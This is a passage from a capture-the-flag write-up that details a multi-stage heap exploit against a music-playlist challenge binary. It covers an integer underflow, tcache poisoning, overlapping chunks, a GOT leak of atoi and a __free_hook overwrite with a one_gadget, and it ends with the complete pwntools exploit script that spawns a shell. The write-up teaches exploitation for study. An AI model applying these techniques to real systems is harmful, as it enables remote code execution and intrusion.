||                ||
||       ...      ||
```

So now we have two addresses we can specify to allocate memory from, where should we target? Well, since playing a song imported from a directory will only allow us to write a single null byte to wherever we want, our first address should probably be one of the song's `song->filedesc`, so that we can read in more memory onto the "heap" through stdin! Since we had decided to reserve song 1 earlier in the exploit, we'll be using song 1's `song->filedesc` location as our target, which we can see is located at the address 0x404078: 

![](https://i.imgur.com/Jwraj9Y.png)

We know this is where song number 1 is located, as that file descriptor is currently 0x3. So, therefore, when a 0x20 sized chunk is allocated over there, after memset(0x404078, 0x0, 1) is called, that song's  `song->filedesc` is now 0, so we can put our arbitrary memory of choice as the song contents of song 1.

What should the next poisoned value be? Well, it can't be song 1's `song->filedesc` location anymore, as we're planning to abuse that. It can't be song 2's `song->filedesc` location, as song 2 has already been freed, which since `song_count` doesn't decrement upon calling `remove_song()` this won't do us any good. We could choose to have the second address be song 3's `song->filedesc` location, but since we need to allocate a chunk of size 0x20 before we can overwrite song 1's `song->filedesc` value to 0, to keep everything organized, we won't put that there either. This leaves us with song 4's `song->filedesc` location, which, since song 4 has the file descriptor of 6, we can find by viewing the .bss address that points to a value of 6:

![](https://i.imgur.com/QCqMdEU.png)

Our final payload now would look something like the following, with the bss_segment addresses defined:

```python

bss_segment = p64(0x404078) #Song num 1's fd
bss_segment_2 = p64(0x404120) #Song num 4's fd (cuz song 2 and eventually 3 is now gone :()
payload = "A"*32
payload += bss_segment
payload += "B"*(32-8)
payload += bss_segment_2
payload += "C"*760


payload += p64(0) + p64(0x3c1) #Song num 45 is now in a 0x3c0 byte chunk
payload += "\x00"*(880 - 848 - 8)
payload += p64(0x3c1) #Song num 46 is now in an 0x3c0 byte chunk
payload += "\x00"*48
play_overflow("44", "-1", payload)
```

Now let's make use of it! First, now that we have corrupted song 45 and 46's `mchunk_size` headers to be 0x3c1, we can now free them. Do note that it's important to free song number 46 and then 45, so that when we reuse one of these chunks, the chunk for song 45 (which is located above 46) gets recycled first, allowing us to overwrite the `fd` pointer for freed chunk of song 46, poisoning it's tcache. We can do it with the following python snippet:

```python=
delete("46")
delete("45")
```

Let's actually see how the bin pointers look like now. We'll add an `sh.interactive()` at the end of our current exploit so that we can attach pwndbg to the process, and view the bins layout:

![](https://i.imgur.com/tj9XlkJ.png)

Well, our poisoning attack definitely worked for the 0x20 tcache bin and the 0x310 tcache bin, as they point to the .bss section now. Looking back at the heap layout ascii diagram, and back at this picture, we can deduce that freed song number 45 is at 0x4055b0, freed song number 46 is at 0x4055d0, freed song number 23 is at 0x4055f0. Since they're only 0x30 apart from each other, but they're all in the 0x3c0 tcache bin (so the heap thinks they're 0x3c0 in size), we can see that the overlap has worked as all three chunks have been overlapped.

(You may be wondering, why did I bother dealing with song number 46 at all if I can have the freed song number 45 overlap with freed song number 23. Well, that's correct - I don't really need song number 46. However this makes organization easier, as I did need a spot that I can be confident is free-able later on....you'll see!)

Looking at the bin diagram above, we can see that we need to allocate one memory chunk of size 0x20 before we can get malloc to return to song 1's `song->fd` location. We can actually do both now, since all we care about is setting song 1's `song->fd` to 0:

```python
play("14")
play("15") #Song no 1 now has fd 0
```

We also need to allocate one memory chunk of size 0x310 before we can get malloc to return to song 4's `song->fd` location. We should do the first one now:

```python
play("3")
```

It's now time to get an address leak! When we play song 1 (which had its `song->filedesc` memsetted to 0) and specify a size of 767 (which is the `nybtes` size description in the `Rainbow/godzilla.txt` file), it should return us a pointer to song 4's `song->filedesc` location. Unfortunately, it memsets 768 bytes from that location to 0 right after that, which we need besides getting the leak we need to fix the damage that the memset has done. Otherwise, when the binary calls `list_playlist()`, it may try to print from invalid address locations, causing the program to crash.

(By the way, you can pass a null pointer to `printf` and have it not crash. However, we also want to make sure that there aren't pointers that were partially, but not completely, overwritten by 0's. If we were to pass a partially-overwritten pointer to `printf`, the program will try to read from that invalid address, and will crash.)

We can now read 767 bytes into the location of song 4's `song->filedesc` value. Recall that the struct is laid out in the following manner...:

```clike=
struct song {
    char filename[0x18]; //0x404078 (fd_offset) - 0x404060 (song)
    uint64_t filedesc; //0x404080 (authorptr) - 0x404078 (fd_offset)
    char * authorptr; //0x404088 (songtitleptr) - 0x404080 (authorptr)
    char * songptr; //0x404090 (song_content_ptr) - 0x404088 (songtitleptr)
    char * songcontentptr;
}; //0x18 + 8 + 8 + 8 + 8 = 56 bytes in size

struct songs[50]; //where the songs are stored, aka. in the .bss
```

Since these structs are laid out in an array, each song's struct is adjacent to one another. We'll begin at song 4's `song->filedesc` location, and visualize the .bss memory as follows:

```
------------------
|                | <- song 4's filedesc
------------------
|                | <- song 4's authorptr
------------------
|                | <- song 4's songptr
------------------
|                | <- song 4's songcontentptr
------------------
|                | <- song 5's filename
|                |
|                |
------------------
|                | <- song 5's filedesc
------------------
|                | <- song 5's authorptr
------------------
        ...
```

Recall also that when `list_playlist()` is called, the program prints out the strings (using `printf`) that are pointed to by the `song->authorptr` and `song->songptr`. We can overwrite these pointers to point to `atoi()` in the GOT table to get a libc leak! Finding the GOT location for `atoi()` can be done by running `objdump -d tiktok` utility, and looking at the .plt entry for `atoi()`, where the .plt entry is what a dynamically-linked program calls to jump to the libc address of the libc function.

![](https://i.imgur.com/1YMEaRy.png)

Looks like the global offset table entry for `atoi` is at 0x403fd0!

We'll first begin the payload to clobber the .bss with the following:

```python
atoi_got = p64(0x403fd0)
clobber = p64(0x0) #Set song 4's filedesc to 0
```

We can then write the `song->authorptr` and `song->songptr` pointers to point to the GOT entry of `atoi`. After that we can write null values for the next 40 (or 0x28) bytes, which should cover song 4's `song->songcontentptr` which is 0x8 bytes long, song 5's `song->filename` region which is 0x18 bytes long, and song 5's `song->filedesc` region, which is 0x8 bytes long:

```python=
clobber += atoi_got
clobber += atoi_got
clobber += "\x00"*(5*8)
```

Now, remember we need to do this for 767 bytes. However, since now we're back at the next song's `song->authorptr` region, we can loop this process. First, we need to know how much to loop. We can calculate this by computing `(767 - 8) / 56` rounded down, where the 8 is to account for the initial `clobber = p64(0x0)`, and the 56 is the size of the song struct. That expression is equal to 13, so we can loop through this 13 times:

```python=
for i in range(0, 13):
        clobber += atoi_got
        clobber += atoi_got
        clobber += "\x00"*(5*8)
```

There's still some leftover pieces of memory though, as 56 doesn't divide evenly to `767 - 8`. Therefore, we still need to fill `767 - 8 - (56 * 13)`or 31 bytes, which is enough to fill the next song's `song->authorptr` pointer, `song->songptr` pointer, and `31 - 16` amount of null bytes.

Our final payload to clobber the .bss is the following:

```python
atoi_got = p64(0x403fd0)
clobber = p64(0x0) #Set song 4's filedesc to 0
#Gonna clobber the .bss with an allocation. First need to generate the payload
for i in range(0, 13):
        clobber += atoi_got
        clobber += atoi_got
        clobber += "\x00"*(5*8)
        
#Fix up the end to not corrupt any pointers
clobber += atoi_got
clobber += atoi_got
clobber += "\x00"*(31-16)
play_overflow("1", "767", clobber) #Song num 4-17's song->filedesc is set to 0, and their song author pointer points to atoi, which has atoi libc address
```

Let's put an `sh.interactive()` at the end to see what happens when view the playlist:

![](https://i.imgur.com/iGRF0tl.png)

Looks like we're definitely leaking something! We can capture this leak by adding the following to our exploit, which captures song 15's author pointer's printed values (this was pretty arbitrary, ngl):

```python
atoi_libc = u64(list(6, "15. ").ljust(8, '\x00'))
log.success("Atoi in libc: " + hex(atoi_libc))
```

When we run the exploit now, we see that we have successfully leaked the `atoi()` address in libc!

![](https://i.imgur.com/wZ27oS7.png)

Yay!

(Note: when I'm doing local exploit dev, I try to disable ASLR to make it easier to debug. However, ASLR still exists on the remote system, which is why I need to leak a libc address to figure out where other addresses within libc is. ASLR will randomize the absolute addresses of functions and objects, but the relative offsets between functions and objects of the same memory page is the same. Therefore, if you can leak the address of any function/object, you can use the offsets to calculate the address of any other function/object that's located within the same memory page.)

## Hooking that one_gadget

![](https://i.imgur.com/7dRgEkv.png)

(Source: https://www.facebook.com/OfficialInspectorGadget/)

So now that we have a leak, what can we do? We can't overwrite the GOT table since full RELRO is enabled, and there's no function pointers anywhere in the binary that we can overwrite to change the execution flow. However, we now know where everything in libc is, so maybe there's function pointers that we can overwrite there?

Enter `__malloc_hook()` and `__free_hook()`.

What do these function pointers do? From the manpage of `__free_hook` (which you can view by running `man __free_hook`):

![](https://i.imgur.com/DwfreHb.png)

Basically these are function pointers that applications can use if they want to use their own allocator. Normally, when they're not set, their value is 0x0, and when you call `malloc()` or `free()`, the c library executes their internal `int_malloc()` or `int_free()` function which handles the tcache allocation. However, if for example the `__free_hook()` is set to the address of another function (which could be another function in the binary, another function in a shared libraary, anything), the program will
call that function pointer instead and completely forgo the tcache allocator's internal freeing mechanism.

(And yes, even though the manpage says this feature is deprecated, overwriting `__malloc_hook` and `__free_hook` still works in exploitation. Actually remove your deprecated features people!!)

We will be overwriting `__free_hook` for this exploit. First, we'll need to calcuate the address of the libc base. We first need the offset of `atoi` from the libc base, which we can find by running `readelf -s libc-2.27.so | grep atoi`:

![](https://i.imgur.com/wTqphox.png)

This means that we can take our leaked `atoi` address, and subtract 0x40680 from it to get the libc base address. Next, we need the address of `__free_hook`:

![](https://i.imgur.com/EspuzXv.png)

This means that we can take our computed libc base address, add 0x3ed8e8 to it, and the result is the location of `__free_hook`.

However, we know where we want to write, but what should we overwrite `__free_hook` with? One option is to overwrite `__free_hook` with the address of `system()`, and then free the string "/bin/sh" to get a shell. That's the smart way to do it, and the other two teams as well as trashcanna solved this challenge using that method. I didn't realize we could do that though, so I opted for something else instead: One gadgets in libc.

What are one_gadgets? They're like the so-called rop gadgets, except executing it will automatically grant you a shell, provided that you can meet certain memory/register constraints.

You might be wondering: Why TF does libc have memory locations that will automatically execute `/bin/sh`? Well, consider the assembly dump of a region of memory in libc:
(taken from https://david942j.blogspot.com/2017/02/project-one-gadget-in-glibc.html)

```
; glibc-2.23 (64bit, 16.04 ubuntu, BuildID: 60131540dadc6796cab33388349e6e4e68692053)
   4526a: mov    rax,QWORD PTR [rip+0x37dc47] # 3c2eb8 <_IO_file_jumps@@GLIBC_2.2.5+0x7d8>
   45271: lea    rdi,[rip+0x146eff]           # 18c177 <_libc_intl_domainname@@GLIBC_2.2.5+0x197>
   45278: lea    rsi,[rsp+0x30]
   45278: mov    DWORD PTR [rip+0x380219],0x0 # 3c54a0 <__abort_msg@@GLIBC_PRIVATE+0x8c0>  
   45287: mov    DWORD PTR [rip+0x380213],0x0 # 3c54a4 <__abort_msg@@GLIBC_PRIVATE+0x8c4>
   45291: mov    rdx,QWORD PTR [rax]
   45294: call   cbbc0 <execve@@GLIBC_2.2.5>
```

(yes this is an older glibc, newer libcs still have these all over the place).

The GNU C library is huge. Therefore, it's not altogether unrealistic for some sequences of bytes to be present in the C library that almost calls `execve("/bin/sh", NULL, NULL);`, especially if we look at the `system()` function in libc, which eventually calls `execve("/bin/sh", ["-c", arg], environ)`. However, these gadgets aren't perfect: They only work when certain constraints are met. For the above example, since this is a 64 bit binary, we can see that the `lea    rsi,[rsp+0x30]` instruction may cause problems. Since in 64 calling conventions, the rsi register is the second argument for a function, and so if we want the second argument to be NULL, the memory region located at `rsp+0x30` must be 0.

We won't go too in-depth on how this works, however there's a great article here: https://david942j.blogspot.com/2017/02/project-one-gadget-in-glibc.html

There's a tool that can not only find these one_gadgets in libc, but also find the constraints needed to get a shell! Not surprisingly, that tool is called one-gadget: (https://github.com/david942j/one_gadget, written by the same researcher who wrote that blog post)

When we installed and ran this tool against our libc, we found the following possible gadget location offsets:

![](https://i.imgur.com/G2RdXks.png)

We don't know how to make constraints meet, so we pick the one that has the least amount of constraints, and hope it's good enough to win. (If not, we can always change the offset to another gadget!)

Putting the address calculations together, we can now add them to our exploit:

```python=
atoi_offset = 0x40680
onegad_offset = 0x4f322
free_hook_offset = 0x3ed8e8

libc_base = atoi_libc - atoi_offset
free_hook_libc = libc_base + free_hook_offset
one_gadget_libc = libc_base + onegad_offset

log.success("libc base: " + hex(libc_base))
log.success("Free hook location: " + hex(free_hook_libc))
log.success("One gadget location: " + hex(one_gadget_libc))
```

We now know where to write, what to write, and we have the ability to overlap and poison the tcache bins a second time. Let's finish this exploit up!

For a sanity check, let's add an `sh.interactive()` after the leak to see how the bin structs look like:

![](https://i.imgur.com/z7GQGTi.png)

Our 0x20 and 0x310 tcache bins are toast at this point - trying to allocate anything in that memory size range will attempt to allocate memory from the addresses 0x3 and 0x6 respectively, which is invalid. However, we still have the 0x3c0 tcache bin we can use, which is the one we were able to get chunks to overlap each other on. 

Recall also that when we clobbered the .bss section, we set many of the song's file descriptors to 0. This means that when we play these clobbered songs, we can specify how much to allocate and what input to write in any of them!

Again, first we need to find the offset. We can do that by adding the following to our exploit:

```python
play_overflow("4", "946", cyclic(100))
```

The reason why I'm specifying to allocate 946 bytes is that that's the size of the freed song # 23, which was `Animal/animal.txt`. which belongs in the 0x3c0 tcache chunk range. Let's see what the heap bin layout looks like after this: 

![](https://i.imgur.com/HI6tfKE.png)

Looks like the offset is 32! We can then modify that allocation to be the following:

```python=
play_overflow("4", "946", "A"*32 + p64(free_hook_libc))
```

Song number 4 has now been allocated at where freed song number 45 used to be at. We now need to allocate two more times: Once to recycle freed song number 46, and one more to overwrite `__free_hook` to point to `one_gadget`

```python
play_overflow("5", "946", "omgplswork")
play_overflow("6", "946", p64(one_gadget_libc) + "\x00"*100)
```

(yes by that time it's already been well over 24 hours I spent on this challenge....so I really wanted the exploit to work. Don't mind me :P)

By the way, the "\x00"*100 at the end is to ensure that the newline character won't mess any of the neighboring fields up. Since after `__free_hook` there's a lot of lock variables, setting them to be non-0 may result in unpredictable circumstances.

We are almost done! Now, we just need to free something, anything, to get our shell! This is the part that I didn't want to take a risk on, as song number 4 was used to poison the tcache, and song number 6 is located all the way at libc, so I didn't want to free either of them. Therefore, I decided to remove song number 5 (which is why I felt like I needed song # 46 in the first place) We can do that and get a shell by adding the following to the exploit:

```python
delete("4", 1)
sh.recvuntil("Removing: ") #Just to make output nicer
sh.interactive()
```

## Recap

This was an insane journey, so let's recap what we had to do to get a shell:
1. Abuse an interaction with `open()` opening directories and `strtok()` null terminating delimiters to set a song's file descriptor to 0.
2. Abuse an integer underflow to have the program read in way more than what was allocated, resulting in a heap overfow.
3. Use the heap overflow to poison multiple tcache bins at once to get multiple arbitrary `malloc()`s, as well as increasing the `mchunk_size` header of small chunks so that they overlap
4. Use the poisoned tcache to clobber the .bss section, and make the `song->authorptr` and `song->songptr` pointers point to the `atoi()` entry in the GOT table to get a leak.
5. Have the clobber also overwrite many other song's `song->filedesc` pointers so that we can write even more data
6. Use the overlapped heap chunks to do a second tcache poisoning attack, to get `malloc()` to return a pointer to `__free_hook()`
7. Overwrite `__free_hook()` with an one gadget address, and free a song to get a shell

Truely, an exploit chain indeed.

## Final exploit

Here's the final behemoth of an exploit:

```python
from pwn import *
import struct

#Song size:
"""
<directory>: 1 bytes

Animal/animal.txt: 946 bytes
Rainbow/godzilla.txt: 767 bytes
Warrior/pastlive.txt: 829 bytes
"""

context.binary = "./tiktok"
context.terminal = "/bin/bash"

#sh = remote('ctf.umbccd.io', 4700)
sh = process('./tiktok')

@atexception.register
def handler():
	log.failure(sh.recvall())

def imp(path):
	sh.sendlineafter("Choice: ","1")
	sh.sendline(path)
	sh.recvuntil("like to do today?")

def list(amount, tag):
	sh.sendline("2")
	sh.recvuntil(tag)
	return sh.recv(amount)

def play(id, tag="", amount=0):
	sh.sendlineafter("Choice: ", "3")
	sh.sendline(id)
	sh.recvuntil(tag)
	s = sh.recv(amount)
	sh.recvuntil("like to do today?")
	return s

def play_overflow(id, length, content): #Use this if the song you're going to play has its file descriptor overwritten by stdin
	sh.sendlineafter("Choice: ", "3")
	sh.sendline(id)
	sh.sendline(length)
	if len(content) > 0x450: #Check needed due to weird read() buffering over a network.
		print "Error your payload's too long. It is " + str(len(content)) + " bytes."
		exit()
	sh.sendline(content)
	sh.recvuntil("like to do today?")

def delete(id, getsh=0):
	sh.sendlineafter("Choice: ","4")
	sh.sendline(id)
	if getsh == 0:
		sh.recvuntil("like to do today?")

for i in range(0, 11): #ids 1-11 are rainbow-godzilla (767 bytes)
        imp("Rainbow/godzilla.txt")

for i in range(0, 11): #ids 12-22 is a directory (1 bytes)
        imp("Warrior")

for i in range(0, 11): #ids 23-33 is animal-animal (946 bytes)
        imp("Animal/animal.txt")

for i in range(0, 10): #ids 34-43 is Warrior-pastlive (829 bytes)
        imp("Warrior/pastlive.txt")
        
badfile = "Warrior" + "/"*(0x18-len("Warrior"))
imp(badfile) #Number 44 now has stdin as file descriptor

play("12")
play("13")
play("2") #Reserving song #1 for later use


imp("Warrior") #These will be used in the final tcache poison
imp("Warrior")
play("45")
play("46")

play("23")

delete("13")
delete("12")
delete("2")
delete("23")

bss_segment = p64(0x404078) #Song num 1's fd
bss_segment_2 = p64(0x404120) #Song num 4's fd (cuz song 2 and eventually 3 is now gone :()
payload = "A"*32
payload += bss_segment
payload += "B"*(32-8)
payload += bss_segment_2
payload += "C"*760


payload += p64(0) + p64(0x3c1) #Song num 45 is now in a 0x3c0 byte chunk
payload += "\x00"*(880 - 848 - 8)
payload += p64(0x3c1) #Song num 46 is now in an 0x3c0 byte chunk
payload += "\x00"*48
play_overflow("44", "-1", payload)

delete("46")
delete("45")

play("14")
play("15") #Song no 1 now has fd 0

play("3")

atoi_got = p64(0x403fd0)
clobber = p64(0x0) #Set song 4's filedesc to 0
#Gonna clobber the .bss with an allocation. First need to generate the payload
for i in range(0, 13):
        clobber += atoi_got
        clobber += atoi_got
        clobber += "\x00"*(5*8)
        
#Fix up the end to not corrupt any pointers
clobber += atoi_got
clobber += atoi_got
clobber += "\x00"*(31-16)
play_overflow("1", "767", clobber) #Song num 4-17's song->filedesc is set to 0, and their song author pointer points to atoi, which has atoi libc address

atoi_libc = u64(list(6, "15. ").ljust(8, '\x00'))
log.success("Atoi in libc: " + hex(atoi_libc))

atoi_offset = 0x40680
onegad_offset = 0x4f322
free_hook_offset = 0x3ed8e8

libc_base = atoi_libc - atoi_offset
free_hook_libc = libc_base + free_hook_offset
one_gadget_libc = libc_base + onegad_offset

log.success("libc base: " + hex(libc_base))
log.success("Free hook location: " + hex(free_hook_libc))
log.success("One gadget location: " + hex(one_gadget_libc))

play_overflow("4", "946", "A"*32 + p64(free_hook_libc))
play_overflow("5", "946", "omgplswork")
play_overflow("6", "946", p64(one_gadget_libc) + "\x00"*100)
delete("4", 1)
sh.recvuntil("Removing: ") #Just to make output nicer
sh.interactive()
```

## Epilogue

When I first gotten a working exploit, my initial tcache poison was much longer than the one in the final state, because I felt like I had to poison all of the possible tcache bins. This resulted in my exploit working locally (on the ubuntu 18.04 docker container), but not remotely. (which wtf...it's a docker container....the purpose of these is so that if it works on my system it should work on yours...)

I needed a lot of nudges from trashcanna to figure out why that's the case, and eventually learned that reason this fails remotely has to do with how the `read()` call works over the network. Apparently, raw `read()` calls will stop reading prematurely after reading in around 0x600 bytes, which still to me makes no sense as stdin buffering was disabled at the start. Anyways, as [an enlightened security professional had tweeted](https://twitter.com/IanColdwater/status/1248633641468649472), since "the internet or linux or computers are made of sand and duct tape and popsicle sticks", we shouldn't really expect them to handle everything properly. Ah well.

After we change the final exploit to attack the remote server instead, our journey is finally over, as we get a shell and get the flag!
![](https://i.imgur.com/dPoQf6O.png)

This was an incredible journey. Thank you so much trashcanna and the UMBC Cyber Dawgs for writing this challenge and hosting this CTF! 

I think what I like most about this challenge is that we had to exploit multiple vulnerabilities to be able to get a shell. That's not seen very much in CTFs. Another thing I love is how realistic these vulnerability mistakes are. If I were to write a similar app, I'm pretty sure I'd make the same mistakes as well, which is another thing that doesn't show up very often in CTFs. All of the restrictions that increase the difficulty of exploitation and force us to exploit efficiently are incredibly realistic as well, which, again, many pwn challenges lack in other CTFs. Everything else about this challenge was just *perfection*. All these puts this challenge easily into my most favorite pwnable I have done, and I anticipate will do for a very, very long time.

Definitely looking forward to next year for sure :)

